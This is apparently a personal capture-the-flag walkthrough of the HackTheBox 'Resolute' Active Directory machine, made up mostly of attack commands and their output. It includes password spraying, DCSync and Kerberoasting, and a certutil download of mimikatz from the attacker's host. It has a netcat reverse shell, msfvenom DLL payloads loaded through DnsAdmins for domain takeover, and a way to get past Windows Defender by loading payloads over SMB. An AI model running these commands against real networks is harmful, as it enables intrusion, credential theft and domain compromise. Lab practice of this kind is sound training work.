### Namp
```bash
nmap -vv --reason -Pn -T4 -sV -p 445 "--script=banner,(nbstat or smb* or ssl*) and not (brute or broadcast or dos or external or fuzzer)" -oN "/home/alvin/Documents/OSCP-PWK/HackTheBox/Windows/Active Directory/Resolute/results/10.129.96.155/scans/tcp445/tcp_445_smb_nmap.txt" -oX "/home/alvin/Documents/OSCP-PWK/HackTheBox/Windows/Active Directory/Resolute/results/10.129.96.155/scans/tcp445/xml/tcp_445_smb_nmap.xml" 10.129.96.155
```
Above nmap smb command get users_raw.txt

```bash
grep MEGABANK users_raw.txt | cut -d '\' -f2 | awk '{print $1}' > users.txt
```

### rpcclient
```bash
cat rpc_users_raw.txt | cut -d '[' -f2 | awk '{print $1}' | tr -d ']' > rpc_users.txt
```

### ASREP roasting
```bash
impacket-GetNPUsers megabank.local/ -dc-ip $IP -no-pass -usersfile users.txt 

impacket-GetNPUsers megabank.local/ -dc-ip $IP -no-pass -usersfile rpc_users.txt 
```

### SMB
##### smbmap
```bash
smbmap -H $IP 
smbmap -H $IP -u null -p ''
smbmap -H $IP -u ''
```
##### smbclient
```bash
smbclient -N -L \\\\$IP
```
##### crackmapexec
```bash
crackmapexec smb $IP --shares
```

### ldapsearch
```bash
ldapsearch -x -H ldap://$IP -b "dc=megabank,dc=local" -s base '(objectclass=*)' > ldapsearch_with_dc.txt
```

### Kerbrute to check valid users since users.txt has plaintext password
```bash
/opt/kerbrute_linux_amd64 userenum -d megabank.local --dc $IP users.txt
```

|   MEGABANK\marko (RID: 1111)
|     Full name:   Marko Novak
|     Description: Account created. Password set to Welcome123!

### Access Check should be done before trying login
##### winrm
```bash
crackmapexec winrm $IP -u marko -p 'Welcome123!'

SMB         10.129.96.155   5985   RESOLUTE         [*] Windows 10.0 Build 14393 (name:RESOLUTE) (domain:megabank.local)
HTTP        10.129.96.155   5985   RESOLUTE         [*] http://10.129.96.155:5985/wsman
WINRM       10.129.96.155   5985   RESOLUTE         [-] megabank.local\marko:Welcome123!
```

### SMB with marko
```bash
smbclient -L $IP -U=marko%'Welcome123!'
smbclient -L megabank.local -U=marko%'Welcome123!'
smbmap -H $IP -u marko -p 'Welcome123!'
smbmap -H megabank.local -u marko -p 'Welcome123!'
smbmap -H $IP -d megabank.local -u marko -p 'Welcome123!'
```

### rpcclient
```bash
rpcclient -U marko $IP 
```

### WinRM connection in linux (HackTricks)
```bash
evil-winrm -u marko -p 'Welcome123!' -i http://10.129.96.155:5985/wsman
evil-winrm -u marko -p 'Welcome123!' -i $IP
evil-winrm -u marko -p 'Welcome123!' -i megabank.local
```

### ldapdomaindump
```bash
ldapdomaindump megabank.local -u "MEGABANK\marko" -p 'Welcome123!'
ldapdomaindump megabank.local -u "MEGABANK.local\marko" -p 'Welcome123!'
```

### Password spray since the hint "Welcome123!" as a common password
```bash
crackmapexec smb $IP -u users.txt -p 'Welcome123!' --continue-on-success
crackmapexec winrm $IP -u users.txt -p 'Welcome123!' --continue-on-success
crackmapexec smb $IP -u rpc_users.txt -p 'Welcome123!' --continue-on-success
crackmapexec winrm $IP -u rpc_users.txt -p 'Welcome123!' --continue-on-success
```

SMB         10.129.96.155   445    RESOLUTE         [+] megabank.local\melanie:Welcome123!
WINRM       10.129.96.155   5985   RESOLUTE         [+] megabank.local\melanie:Welcome123! (Pwn3d!)

# Foothold
```bash
evil-winrm -u melanie -p 'Welcome123!' -i $IP
```

## Blind Attacks
### Blind Dsync attack
```bash
impacket-secretsdump -just-dc melanie:'Welcome123!'@$IP
```

### Kerberoasting
https://0xdf.gitlab.io/2018/12/08/htb-active.html#kerberoasting

```bash
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py -request -dc-ip $IP megabank.local/melanie:Welcome123!
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py megabank.local/melanie:Welcome123! -request
```

### BloodHound first
```bash
sudo /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -user as -password as
```
```evil-winrm
net use \\10.10.16.13\share /u:as as
The command completed successfully.

copy 2022* \\10.10.16.13\share
```
##### Clean up by del the share
`net use /d \\10.10.16.13\share`

Reachable High Value Targets -> CanPSRemote -> Dsync attack

```powershell
$SecPassword = ConvertTo-SecureString 'Welcome123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('MEGABANK.LOCAL\melanie', $SecPassword)

$session = New-PSSession -ComputerName RESOLUTE.MEGABANK.LOCAL -Credential $Cred
Invoke-Command -Session $session -ScriptBlock {Start-Process cmd}
Invoke-Command -Session $session -ScriptBlock {ping -n 2 10.10.16.13}
```
Invoke-Command -Session $session -ScriptBlock {.\nc.exe -e cmd 10.10.16.13 9001}

certutil -urlcache -f http://10.10.16.13/mimikatz.exe alvin1.exe

.\alvin1.exe lsadump::dcsync exit

It didn't work since mimikatz got deleted by AV. And looks like need to get ryan first

### Lateral movement
```evil-winrm
.\lazagne.exe all
```
deleted just like mimikatz

### Credential Hunting manually
```
findstr /SIM /C:"password" *.txt *ini *.cfg *.config *xml
findstr /SIM /C:"ryan" *.txt *ini *.cfg *.config *xml
``` 
first one from the result. Be careful don't overlook.

PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt

```
*Evil-WinRM* PS C:\> type PSTranscripts\20191203\PowerShell_transcript.RESOLUTE.OJuoBGhU.20191203063201.txt
**********************
Windows PowerShell transcript start
Start time: 20191203063201
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
Command start time: 20191203063455
**********************
PS>TerminatingError(): "System error."
>> CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')
if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Command start time: 20191203063455
**********************
PS>ParameterBinding(Out-String): name="InputObject"; value="PS megabank\ryan@RESOLUTE Documents> "
PS megabank\ryan@RESOLUTE Documents>
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Invoke-Expression): "Invoke-Expression"
>> ParameterBinding(Invoke-Expression): name="Command"; value="cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!

if (!$?) { if($LASTEXITCODE) { exit $LASTEXITCODE } else { exit 1 } }"
>> CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="Stream"; value="True"
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
**********************
Command start time: 20191203063515
**********************
PS>CommandInvocation(Out-String): "Out-String"
>> ParameterBinding(Out-String): name="InputObject"; value="The syntax of this command is:"
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
cmd : The syntax of this command is:
At line:1 char:1
+ cmd /c net use X: \\fs01\backups ryan Serv3r4Admin4cc123!
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : NotSpecified: (The syntax of this command is::String) [], RemoteException
    + FullyQualifiedErrorId : NativeCommandError
**********************
Windows PowerShell transcript start
Start time: 20191203063515
Username: MEGABANK\ryan
RunAs User: MEGABANK\ryan
Machine: RESOLUTE (Microsoft Windows NT 10.0.14393.0)
Host Application: C:\Windows\system32\wsmprovhost.exe -Embedding
Process ID: 2800
PSVersion: 5.1.14393.2273
PSEdition: Desktop
PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.14393.2273
BuildVersion: 10.0.14393.2273
CLRVersion: 4.0.30319.42000
WSManStackVersion: 3.0
PSRemotingProtocolVersion: 2.3
SerializationVersion: 1.1.0.1
**********************
```

ryan Serv3r4Admin4cc123!
```
net user ryan
net localgroup "Remote Management Users"
ryan belongs to Contractors belongs to it
```
```bash
evil-winrm -i $IP -u ryan -p 'Serv3r4Admin4cc123!'
```

### Privilege Escalation
`whoami /priv` nothing interested so `whoami /group`
#### Windows Group Privileges
Built-in Groups - DnsAdmins
##### DnsAdmins
Generating Malicious DLL with `msfvenom`
```bash
msfvenom -p windows/x64/exec cmd='net group "domain admins" ryan /add /domain' -f dll -o adduser.dll

or

msfvenom -p windows/x64/exec cmd='net user administrator Qwer4321!' -f dll -o adminpwd.dll

or 

msfvenom -p windows/x64/shell_reverse_tcp lhost=10.10.16.13 lport=9389 -f dll -o rev.dll <- This one works. Maybe because the box is weird. And revshell is reliable than others.
```
```
dnscmd.exe /config /serverlevelplugindll C:\Users\ryan\desktop\adduser.dll

sc stop dns

sc start dns

net group "Domain Admins" /dom
```
##### Transferring to the box will trigger Windows Defender. So use smbserver to bypass it.
```bash
sudo /usr/share/doc/python3-impacket/examples/smbserver.py share . -smb2support -user as -password as
```

```
net use \\10.10.16.13\share /u:as as

dnscmd.exe /config /serverlevelplugindll \\10.10.16.13\share\adduser.dll
dnscmd.exe /config /serverlevelplugindll \\10.10.16.13\share\shell.dll
dnscmd.exe /config /serverlevelplugindll \\10.10.16.13\share\rev.dll
dnscmd.exe /config /serverlevelplugindll \\10.10.16.13\share\adminpwd.dll

sc stop dns
sc.exe stop dns
sc start dns
sc.exe start dns

net group "Domain Admins" /dom
```

Above doesn't work well. Because it needs to specify the DNS server name. Here is the \\resolute as from nmap, scans and bloodhound. Also worth to try the `127.0.0.1` or localhost
##### Clean up by del the share
`net use /d \\10.10.16.13\share`
```
net use \\10.10.16.13\share
dnscmd.exe /config /serverlevelplugindll \\10.10.16.13\share\rev.dll
sc.exe \\resolute stop dns
sc.exe \\resolute start dns
```